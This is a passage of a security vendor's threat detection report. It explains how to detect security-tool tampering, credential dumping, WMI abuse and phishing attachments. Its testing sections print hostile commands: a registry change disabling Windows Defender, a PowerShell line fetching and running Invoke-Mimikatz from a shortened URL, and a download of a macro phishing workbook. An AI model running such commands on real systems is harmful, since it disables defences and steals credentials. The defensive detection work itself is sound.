with security scanning or event reporting.Detection 
MITREs data sourcesAPI monitoringFile monitoringServicesWindows RegistryProcess command\-line parametersAntivirusCollection requirementsDefense evasion techniques are generally non\-specific with respect to the types of systems or data that you are trying toprotect. Thus, any security tool that produces defensive telemetryto include event logs or alerts, or logs of the tools stateand configurationwill be immensely valuable when building detection criteria.672020 Threat Detection ReportProcess monitoringOne data source that we recommend adding is process monitoring, as the presence of running processes or actions takento stop a running process are both valuable data points.File monitoring and Windows RegistryFile monitoring and Windows Registry will be most useful in determining whether a tool is running or its startupconfiguration has been changed. Returning to TrickBot as a relevant example, most of the evasions that this tool puts inplace will result in a change to relevant data in one of these two locations.Process command\-line parametersSimilarly, monitoring for process command\-line parameters will often reveal the act of making these changes, whileservices will reveal a common result.Detection suggestionsDetection of this technique can be abstracted into two categories: detection of overt or otherwise known forms oftampering and identification of new techniques.Detection of overt or known forms of tampering can be effective when you understand how your security tools aredeployed, configured, and operated. A simple checklist that you can use to build basic detection use cases might look like this:What process is used to install the software, and what changes are made to the system?Understanding the install file structure itself, the name and appearance of the process that executes the installer,and the files andor Registry changes (configurations) that the installer makes is a good baseline.Do configurations change under normal circumstances?If so, how do specific configurations change, and under what process and user context do these changes appear?What are the process and service names associated with the software?Monitor for use of process and service controls (start, stop, add, remove, change) related to these items, whichwill vary by platform.What other processes will interact with the software?On Windows, monitor for cross\-process events, such as injection or thread manipulation.More advanced techniques can be a challenge, as they rely on detailed knowledge of the software, require that you detectthe absence of data, or both.Like all software, security software contains bugs. Some of those bugs introduce vulnerabilities that can be exploited.Understanding the resourcesDLLs, drivers, shared objects, and other kernel\-level extensionsrequired or loaded bythe software can help build additional monitoring use cases. Unless the software is intentionally changed, the resourcesleveraged by the software should not change, be replaced, or appear in new locations.682020 Threat Detection ReportLastly, look out for tampering in the absence of any overt behavior. If your EDR platform emits a median of 10 events perendpoint per second, and that drops to five: is there a predictable cause? Would you even notice? Could you practicallyinvestigate? Apply this same logic to the presence or contents of log files.Detecting anything other than the complete absence of data is a challenge for most organizations. Start by keeping itsimple and move towards the complex:Detect the complete absence of data from a given controlDetect the absence of a particular data element (e.g a heartbeat or regularly occurring value)Detect the absence of a type of data (e.g the absence of file modification events when all other eventsappear as expected)Detect on deviations from median event rateTestingStart testing your defenses against Disabling Security Tools using Atomic Red Teaman open source testing framework ofsmall, highly portable detection tests mapped to MITRE ATT\&CK.692020 Threat Detection ReportGetting startedView Atomic tests for T1089: Disabling Security Tools. In most environments, these should be sufficient to generate a usefulsignal for defenders.Run this test on a Windows system using PowerShell:Set\-ItemProperty HKLM:SOFTWAREPoliciesMicrosoftWindows Defender\-Name DisableAntiSpyware \-Value 1Useful telemetry will include:DATA SOURCETELEMETRYProcess monitoringpowershell.exeRegistry modificationsPowerShell manipulating Windows Defender operation702020 Threat Detection ReportReview and repeatNow that you have executed one or several common tests and checked for the expected results, its useful to answer someimmediate questions:Were any of your actions detected?Were any of your actions blocked or prevented?Were your actions visible in logs or other defensive telemetry?Repeat this process, performing additional tests related to this technique. You can also create and contribute testsof your own.DETECTIO NS TRATEGIS TCathy Cramer 
DETECTIO NE NGINEE RThe detection strategies in this section were brought toyou by Cathy Cramer! Cathy can spot cyber threats from amile away. She can also secure web apps, program, speakmultiple languages, and build architectural designs. Beforejoining Red Canary as a detection engineer, she workedwith the threat analysis team at Carbon Black.712020 Threat Detection ReportA DDITIONA LR ESEARCH :TECHNIQU ET 1 0 0 3Credential DumpingWhile it wasnt among our top 10 threats by volume, Credential Dumping affected a wide swath of our customers, due in no 
small part to the prominence of tools such as Mimikatz.32%ORGANIZATIONSAFFECTE D762C ONFIRMEDTHREATS\#11O VERALLRAN KAnalysis201812201911Change1Credential Dumping accounted for a slightlylarger percentage of total threats in 2019but affected a slightly smaller percentageof customers.Why do adversaries Dump Credentials?Credential Dumping refers to a variety of methods that adversaries and professional penetration testers use to obtainlegitimate usernames and passwords. Legitimate credentials offer adversaries one of the most effective and discreet meansof accessing valuable data and systems. While there are methods of access that dont require legitimate user credentials(vulnerability exploitation, for example), a working username and password are among the best tools for inconspicuouslyaccessing a system of interest. For this reason, there is a vibrant market for stolen credentials on a wide variety of criminalforums.Listed under the Credential Access tactic, Credential Dumping also enables initial access, lateral movement, and privilegeescalation. The techniques prevalence is largely the result of necessity. Adversaries effectively need credentials toaccomplish their goals, and there is an abundance of very effective credential theft tools (e.g Mimikatz, L0phtCrack, andgsecdump) that help accommodate this need.722020 Threat Detection ReportMimikatz is a major contributor to the prominence of Credential Dumping among threat detections in the environmentswe monitor.THREA TV OLUM EHow do adversaries Dump Credentials?Some behaviors we commonly observe are:PowerShell and other processes (e.g Windows Task Manager and Sysinternals ProcDump) accessing and dumpingmemory from the Local Security Authority Subsystem Service (lsass.exe)NTDSUtil dumping NTDS.dit (Active Directory)Active Directory Explorer (AD Explorer) taking snapshots of Active DirectoryWindows Registry Console Tool (reg.exe) exporting Windows Registry hives containing credentialsWindows Credential Editor dumping NT Lan Manager (NTLM) hashesEmerging tacticsSome less common behaviors include:Using Credential Dumping tools such as SafetyKatz and Cobalt Strike in memoryLeveraging Credential Dumping tools in non\-executable files such as XSL stylesheetSighted withWe frequently observe this technique occurring in tandem with PowerShell (T1086\), which is likely because the most commoninvocation method for Mimikatz relies on PowerShell.732020 Threat Detection ReportC USTOMER SA FFECTE DDefinitionT 1 0 0 3 :CREDENTIA LD UMPIN GCredential dumping is the process of obtaining account login and password information, normally in the form of a hashor a clear text password, from the operating system and software. Credentials can then be used to perform LateralMovement and access restricted information. Several of the tools mentioned in this technique may be used by bothadversaries and professional security testers. Additional custom tools likely exist as well.Detection 
MITREs data sourcesAPI monitoringProcess monitoringPowerShell logsProcess command\-line parametersCollection requirementsMITRE ATT\&CK does not include file monitoring (e.g password files written to disk) among the data sources that are usefulfor observing Credential Dumping. While it may be an indication of credential theft activity along with other data sourcessuch as process monitoring or process command\-line parametersfile monitoring by itself is not a reliable data source forCredential Dumping activity.742020 Threat Detection ReportProcess monitoringProcess monitoring, however, is a data source that security teams should collect from if they want to observe CredentialDumping involving tools such as Mimikatz, Empire, L0phtCrack, and gsecdump. One quick and reliable way to observeand potentially detect credential harvesting is to monitor processes for known malicious binaries in combination withLSASS injection. Understanding the processes or programs in an environment that require access to LSASS will make thisapproach more effective.Process command\-line parametersMonitoring process command\-line parameters for known malicious CLI syntaxes may take some research and testing, butits also a reliable way to observe andor detect credential harvesting activity emanating from tools such as Mimikatz andEmpire. In order for this data source to be used effectively, command lines must be specific and not overly generalized (i.eusing only one command option filter).PowerShell logsEnabling and monitoring PowerShell logs for known malicious syntax can help to detect Credential Dumping activity aswell. This is particularly useful for observing things such as Invoke\-Mimikatz and POWELIKS. At times when maliciousbinaries may not be observed via process monitoring, PowerShell logs may help detect activity reliant on PowerShell.API monitoringAPI monitoring is another good source to collect on if you want to observe Credential Dumping. The key to API monitoringis knowing what and who should be directly connecting to the domain controller (DC). Knowing what IP address,applications, and user accounts typically make API calls to the DC will help to reduce false positives and create morereliable detections to Credential Dumping activity, particularly for tools such as DCSync, Mimikatz, and PowerSploit.Detection suggestionsIf youre interested in generating reliable detection coverage for Credential Dumping activity, youll want to considermonitoring for the following behaviors:Unknown or known malicious processes injecting into LSASSDC connections from unusual IP addresses associated with non\-standard or known compromised user accountsreg.exe usage with command\-line reg save hklmsam752020 Threat Detection ReportThe binary mimikatz.exe or references to Mimikatz arguments in the CLIUse of ntdsutil ifmWeeding out false positivesMany of the techniques and tools used for administrative purposes can also be used for malicious Credential Dumpingactivity. As such, monitoring of processes without CLI andor context can lead to a large number of false positives,particularly with processes such as adfind.exe, taskmgr.exe, ntdsutil.exe, reg.exe, vssadmin.exe, PowerShell, andadexplorer.exe.TestingStart testing your defenses against Credential Dumping using Atomic Red Teaman open source testing framework ofsmall, highly portable detection tests mapped to MITRE ATT\&CK.762020 Threat Detection ReportGetting startedView Atomic tests for T1003: Credential Dumping. In most environments, these should be sufficient to generate a usefulsignal for defenders.Run this test on a Windows system using PowerShell:powershell.exe IEX (New\-Object Net.WebClient).DownloadString(http:bit.lyL3g1tCrad1e); Invoke\-Mimikatz \-DumpCrUseful telemetry will include:DATA SOURCETELEMETRYProcess monitoringpowershell.exeProcess command lineDownloadString, WebClient, and the presence of a URLNetwork connectionpowershell.exe establishing an external network connection772020 Threat Detection ReportReview and repeatNow that you have executed one or several common tests and checked for the expected results, its useful to answer someimmediate questions:Were any of your actions detected?Were any of your actions blocked or prevented?Were your actions visible in logs or other defensive telemetry?Repeat this process, performing additional tests related to this technique. You can also create and contribute testsof your own.DETECTIO NS TRATEGIS TRicky Espinoza 
DETECTIO NE NGINEE RThe detection strategies in this section were brought toyou by Ricky Espinoza! Ricky has eight years of experienceand multiple SANS certifications. Prior to joining RedCanary, Ricky worked at the University of Colorado runningincident response procedures, network security, andvulnerability management.782020 Threat Detection ReportA DDITIONA LR ESEARCH :TECHNIQU ET 1 0 4 7Windows Management InstrumentationOfficially an execution technique, Windows Management Instrumentation (WMI) is leveraged for lateral movement and 
discovery as well. Our many hundreds of WMI detections arise from a wide array of disparate threats.26%ORGANIZATIONSAFFECTE D566C ONFIRMEDTHREATS\#13O VERALLRAN KAnalysis201817201913Change4Why do adversaries use WMI?Jumping from 17th to 13th, WMI saw slightincreases both in terms of the percentage ofcustomers affected and percentage of totalthreat volume.Like many of the threats highlighted in this report, WMI is a native Windows utility that administrators use regularly toautomate tasks and remotely manage systems in their environments. Adversaries generally use WMI for the same reasonsthat administrators use it: to execute processes on remote systems. Since its installed by default and routinely used forbenign purposes, it blends in with normal operating system activity.Security analysts and other network defenders occasionally struggle with WMI process ancestry. For example, maliciousactivity traced back to the WMI Provider Host, WMIPrvSE.exe, leads to a dead end in the process tree. On a local host, thismay mean a WMI Event Consumer was used for persistence.In the case of lateral movement, the WMIPrvSE.exe execution on one host should correlate to a WMI Command Line (wmic.exe) execution on the originating host. Attackers may also leverage WMI to avoid detection based on process ancestry,792020 Threat Detection Reportsuch as using an Office macro to set a WMI event consumer to launch a malicious PowerShell commandthereby avoidingdefenders who monitor PowerShell activity spawned by Office.Specific to the environments we monitor (and contrary to its classification as an execution technique), weve observed asubstantial number of adversaries using WMI to enumerate user accounts or other system information for reconnaissance.Some of our analytics also trigger on adversaries using WMI for lateral movement.THREA TV OLUM EHow do adversaries use WMI?Some of the common ways we see adversaries leveraging WMI include:Executing processes with wmic.exeDiscovering system informationScheduling persistence with WMI structuresLaunching WMI from Office documents to execute commands in phishing campaignsBypassing application whitelisting controlsEmerging tacticsSome less commonbut no less interestinguses of WMI include:Deletion of shadow copies, likely to avoid using vssadmin.exeWMI copying commands to the clipboard in fileless infectionsExecution of stylesheets with wmic.exeAs its prevalence suggests, many threats and threat actors use WMI in their attacks and campaigns. Some noteworthyexamples include:EmotetMetasploitCobalt StrikeWannaCryNotPetyaOilRig802020 Threat Detection ReportOlympic DestroyerEmpireLazarus GroupSighted withAdversaries commonly leverage WMI in concert with PowerShell (T1086\), Windows Management Instrumentation EventSubscription (T1084\), and XSL Script Processing (T1220\). We frequently detect WMI with PowerShell largely because of theGet\-WMICObject cmdlet, which adversaries use to locally or remotely query the Windows operating system to enumerateinformation or execute new processes.As we noted above, adversaries are known to execute stylesheets with wmic.exe, which explains why we see threats leveragingWMI and XSL Script Processing together. This might be a direct result of the Squiblytwo attack technique discussed inthe Detection section below. WMI is commonly used to install event filters and consumers, which is why our detections aresometimes tagged with both WMI and the WMI Event Subscription technique.CUSTOMER SA FFECTE DDefinitionT 1 0 4 7 :WINDOW SM ANAGEMEN TI NSTRUMENTATIO NWindows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environmentfor local and remote access to Windows system components. It relies on the WMI service for local and remote accessand the server message block (SMB) and Remote Procedure Call Service (RPCS)for remote access. RPCS operates overport 135\. An adversary can use WMI to interact with local and remote systems and use it as a means to perform manytactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement.812020 Threat Detection ReportDetection 
MITREs data sourcesAuthentication logsNetflowEnclave netflowProcess monitoringProcess command\-line parametersCollection requirementsIn addition to those data sources listed by MITRE, Windows WMI logging and Sysmon WMI event codes (e.g 19:WmiEventFilter activity detected, 20: WmiEventConsumer activity detected, and 21: WmiEventConsumerToFilter activitydetected) are also good sources to collect from if you want to detect malicious uses of WMI.Process monitoring and command\-line parametersTelemetry drawn from process monitoring and command\-line parameters can be useful for detecting adversarial uses ofWMI, and you can collect it via EDR tools, Sysmon, or native command\-line logging in Windows 7 and newer versions.Process monitoring enables detection strategies that look for malicious use of wmic.exe for process creation, LateralMovement, and reconnaissance.SysmonCompared to other data sourcesWMI Activity logging, for exampleenabling additional Sysmon logging will generate alot of noise. However, the data format is easier to manipulate and ingest into a SIEM, making it easier to build detectionstrategies around.Windows EventIDsEventID 5861 logs generate a permanent record of WMI event subscriptions.Detection suggestionsIn general, only trusted binaries and known administrative tools and processes will initiate WMI activity. As such, it makessense to look for known bad or unusual processes launching WMI.New WMI event consumers will execute the WMI Provider Host (\`WMIPrvSE.exe\`) process. Monitoring WMIPrvSE.exe forabnormal child processes, such asPowerShell or cmd.exe, is a reliable way to detect malice. Emotet, for example, uses this822020 Threat Detection Reporttechnique to obscure the normal parent\-child relationship and execute encoded PowerShell commands via WMIPrvSE.exeto download second\-stage executables.Permanent WMI event consumers offer adversaries a stealthy method of persistence. However, permanent event consumersubscriptions are logged by WMI logging and Sysmon. Legitimate software will leverage these, but they occur infrequentlyand are easy to monitor for malicious use.Looking for unusual parent\-child relationships with unique command\-line parameters is another solid indicator of malice.It should be rare for something like the IIS worker process (w3wp.exe) to spawn wmic.exe. When this occurs, it warrantsinvestigation. This can be a sign that an adversary is leveraging a web shell for process creation, reconnaissance, or forremote access after initially accessing an environment. It is also rare for browsers (IE, Edge, Chrome, Firefox, etc.) to spawnwmic.exe, and, when it does happen, its usually bad.In cases where wmic.exe is being used for credential theft, defenders might consider looking for wmic.exe executions withunusual module loads, including:samlib.dllvaultcli.dllCross process injection into the Local Security Authority Subsystem Service (lsass.exe)That last point requires elevated permissions but can be a reliable signal of credential theft and post\-exploitation toolssuch as Mimikatz.As noted earlier, adversaries frequently abuse wmic.exe to bypass application whitelisting controls and download andexecute malicious VBScript or JScript stylesheets from remote network resources. This technique is known colloquially asSquiblytwo, and security teams can detect it by looking for instances of wmic.exe with URLs in the command lines andthat include the format option. This will typically be accompanied by a module load of jscript.dll and vbscript.dll intowmic.exe.Some malware families will use wmic.exe to create local antivirus exclusions to prevent antivirus\-based detection. Becauseof this, it makes sense to look out for unusual binaries that are unsigned and included in antivirus exclusion rules.Further, its almost always malicious when wmic.exe spawns as a child process of Microsoft Word, PowerPoint, MSPublisher,Visio, Access, Outlook, Onenote, WordPad, or Excel. As such, it makes sense to examine the chain of execution and follow\-on activity when this occurs.Wmic can also leverage the WMI subsystem to execute commands or files remotely. Cobalt Strike, Koadic, and many otherred team and post\-exploitation frameworks will spawn unique and unsigned binaries or commands remotely using thewell\-known process call create command. Monitoring what is being executed in this context can reliably turn up malice. Italso makes sense to look out for wmic.exe making remote connections.Some other considerations:Adversaries can use wmic.exe to interact with remote systems, conduct reconnaissance, and move laterally.Since there are more common tools that are easier to use, Win32\_Process create is rarely used for legitimate reasonsand should be regarded with suspicion.832020 Threat Detection ReportReconnaissance is harder to detect because it looks very similar to normal admin behaviorSurrounding context is important in identifying if queries are malicious or benignIf you want to detect ransomware using WMI to delete shadow copies, consider looking for wmic.exe execution withcommand lines including shadowcopy delete.In rare instances, adversaries running fileless attacks will redirect WMI outputs to the clipboard, which can be detected bylooking for command lines that include output and clipboard.WMI can be stealthily used in almost every phase of an attack. When adversaries leverage it to enumerate local useraccounts and profile devices, security teams can detect it by looking for things such as wmic.exe profiling user accounts,domain information, or even PowerShell querying the operating system or executing new processes, either locally orremotely. Cmdlets such as Get\-WMIObject are often used for reconnaissance.Weeding out false positivesNetwork flow logs and on\-the\-wire WMI traffic is commonly encrypted, so it will blend into standard DCOMPSRemotingtraffic and could generate high volumes of false negatives. This is yet another reasonalong with minimal logging anddefender knowledge of WMIwhy attackers love WMI.TestingStart testing your defenses against Windows Management Instrumentation using Atomic Red Teaman open sourcetesting framework of small, highly portable detection tests mapped to MITRE ATT\&CK.842020 Threat Detection ReportGetting startedView Atomic tests for T1047: Windows Management Instrumentation. In most environments, these should be sufficient togenerate a useful signal for defenders.Run this test on a Windows system using Command Prompt:wmic node:127\.0\.0\.1 process call create calc.exeUseful telemetry will include:DATA SOURCETELEMETRYProcess monitoringchild processes of wmiprivse.exeProcess command lineprocess, create852020 Threat Detection ReportReview and repeatNow that you have executed one or several common tests and checked for the expected results, its useful to answer someimmediate questions:Were any of your actions detected?Were any of your actions blocked or prevented?Were your actions visible in logs or other defensive telemetry?Repeat this process, performing additional tests related to this technique. You can also create and contribute testsof your own.DETECTIO NS TRATEGIS TJesse Brown
DETECTIO NE NGINEE RThe detection strategies in this section were brought to youby Jesse Brown! As a Detection Engineer for Red CanarysCyber Incident Response Team, Jesse works alongside atalented team dedicated to quickly identify and remediatethreats in customer environments. He enjoys dissectingmalware and adversary techniques to help improve theRed Canary detection engine. Jesse holds a Masters ofProfessional Studies in Cybersecurity and InformationAssurance from The PennsylvaniaState University.862020 Threat Detection ReportA DDITIONA LR ESEARCH :TECHNIQU ET 1 1 9 3Spearphishing AttachmentVirtually any adversary can send a phishing email with an attachment and nearly everyone has an email address, hence 
why Spearphishing Attachments are so prominent.22%ORGANIZATIONSAFFECTE D266C ONFIRMEDTHREATS\#20O VERALLRAN KAnalysis201813201920Change7Falling from 13th in 2018 to 20th in 2019,Spearphishing Attachment decreased both interms of customers affected and percent oftotal threat volume.Why do adversaries use Spearphishing Attachments?Given the way we detect threats and map detection logic to ATT\&CK, we are not able to effectively distinguish betweentargeted and scattershot phishing attacks. For the purposes of this report, any phishing attack that relies on a maliciousattachment is considered a Spearphishing Attachment, and the subsequent analysis and detection strategies refer to bothtechniques.Spearphishing Attachments have been very effective for a long time. Historically, adversaries would embed overtlymalicious binaries as attachments in email messages. When the email service providers put controls in place to makethat far more difficult, adversaries evolved and adopted other methods, including drive\-by downloads, exploitingvulnerabilities, leveraging malicious macros, and embedding payloads in various different file types.872020 Threat Detection ReportUltimately, there are many factors that contribute to the popularity of this technique:Human psychologypeople trust sender information and are inclined to open attachmentsSending a phishing email costs almost nothingNearly everyone has an email addressOpen\-source research can improve targeting and effectivenessT HREA TV OLUM EHow do adversaries use Spearphishing Attachments?Adversaries have been embedding macros in Microsoft Office documents and using them to deliver malware since the mid\-2000s. The popularity of malicious macros has ebbed and flowed over the years, as drive\-by downloads and other malwaredelivery mechanisms came into and out of prominence. However, macro\-based phishing schemes have dominated inrecent years, and theyve become more potent than ever with the aid of malicious scripts and tools such as PowerShell.We often find malware hidden in a ZIP file to subvert scanning tools that would otherwise block malicious attachments atthe perimeter. Qbot, for example, uses a VBS file that masquerades as a Word document hidden in a ZIP file for its initialinfection vector.Improvements in email interfaces, filtering, and other technologies have made it more difficult to launch successfulphishing attacks. However, there is no simple technical fix for phishing. Prevention remains highly dependent oneducational efforts, training, and behavioral change.Sighted withAs we mentioned in the PowerShell section of this report, Spearphishing Attachments often occur in tandem with PowerShell(T1086\). In fact, the two techniques occur together more frequently than Spearphishing Attachment occurs on its own. Wealso observe it in tandem with Command Line Interface (T1059\), because PowerShell and Scripting activity manifests on thecommand line, and User Execution (T1204\), as Spearphishing Attachments routinely require user interaction.882020 Threat Detection ReportC USTOMER SA FFECTE DDefinitionT 1 1 9 3 :SPEARPHISHIN GA TTACHMEN TSpearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from otherforms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing areelectronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario,adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution.Detection 
MITREs data sourcesFile monitoringPacket captureNetwork intrusion detection systemDetonation chamberEmail gatewayMail serverCollection requirementsProcess monitoringIn addition to those listed by MITRE ATT\&CK, process monitoring is another valid data source for observing Spearphishing892020 Threat Detection ReportAttachments. Security teams should monitor process activity taking place around the time that an email is read forevidence of attachments executing malicious code.Email gatewaysEmail gateways provide an easy and comprehensive way to filter received emailseffectively in real timebased onfilenames, email size, sender information, subject lines, text within the email, and several other parameters. Emailgateways can be tuned with rules that quarantine, delete, or forward potentially suspicious email messagesbased on anyor all of the attributes above.Mail serversSimilar to the email gateway solutions, mail servers hold a historic archive of sent and received email messages for a givendomain. System administrators can use the mail server to access user emails or block senders, to name a couple of actions.Detonation chamberA detonation chamber allows organizations to safely execute the code stored in malicious attachments in a controlledenvironment, mitigating the risk of infection. Although this defensive measure is effective against most varieties ofSpearphishing Attachments, adversaries can delay execution or stop it altogether when the malicious code is detonated ina virtual environment.Detection suggestionsSpearphishing attacks frequently use Microsoft Office products to execute shell binaries on a victims endpoint. In orderto detect this behavior, consider using an EDR platform to monitor suspicious processes spawning from Office documents.Some examples of processes spawning from malicious attachments include:Windows Scripting Host (wscript.exe or cscript.exe)Command Processor (cmd.exe)PowerShell (powershell.exe) to execute codeIts also worthwhile to monitor your environment for uncommon email attachment types, such as:Extensions associated with legacy Office documents (e.g DOC instead of DOCX)Attachments with unknown file extensions that are capable of executing code or mounting disks (e.g ISO or IMG)Archive file attachments not common within your organization (e.g RAR or ACE)Sender Policy Framework (SPF) records allow domain owners to publish a list of IP addresses that are authorized to sendemails on the organizations behalf. Security teams can reliably detect certain spoofing actions by comparing informationfrom emails received to this list and flagging emails that come from unusual IP addresses.902020 Threat Detection ReportLastly, unsolicited emails received from an external senderparticularly those that are sent outside of normal businesshoursshould be flagged as suspicious.While generally a good practice for smaller and medium\-sized organizations, mail server\-based security controls can beunmanageable for large organizations that send and receive tens of thousands of emails on a daily basis.Weeding out false positivesDetonation chambers, file monitoring, and packet capture solutions are effective at inspecting attachments and identifyingexecutables in different ways. However, they frequently flag legitimate communications between users who are exchangingbenign executables.TestingStart testing your defenses against Spearphishing Attachment using Atomic Red Teaman open source testing frameworkof small, highly portable detection tests mapped to MITRE ATT\&CK.912020 Threat Detection ReportGetting startedView Atomic tests for T1193: Spearphishing Attachment. In most environments, these should be sufficient to generate auseful signal for defenders.Run this test on a Windows system using PowerShell:if (\-not(Test\-Path HKLM:SOFTWAREClassesExcel.Application)){return Please install Microsoft Excel before running this test.}else{$url \= https:github.comredcanarycoatomic\-red\-teamblobmasteratomicsT1193binPhishingAttachment.xlsm$fileName \= PhishingAttachment.xlsmNew\-Item \-Type File \-Force \-Path $fileName \| out\-null$wc \= New\-Object System.Net.WebClient$wc.Encoding \= \[System.Text.Encoding]::UTF8\[Net.ServicePointManager]::SecurityProtocol \= \[Net.SecurityProtocolType]::Tls12($wc.DownloadString($url)) \| Out\-File $fileName}Useful telemetry will include:DATA SOURCETELEMETRYProcess monitoringChild processes of excel.exeNetwork connectionEstablished from a child process below Excel922020 Threat Detection ReportReview and repeatNow that you have executed one or several common tests and checked for the expected results, its useful to answer someimmediate questions:Were any of your actions detected?Were any of your actions blocked or prevented?Were your actions visible in logs or other defensive telemetry?Repeat this process, performing additional tests related to this technique. You can also create and contribute testsof your own.DETECTIO NS TRATEGIS TErnesto Lleras
DETECTIO NE NGINEE RThe detection strategies in this section were brought toyou by Ernesto Lleras! Ernesto relentlessly investigatescustomer environments for evidence of malicious behavior.Before joining Red Canary, he worked as a cybersecurityanalyst for a regional bank.93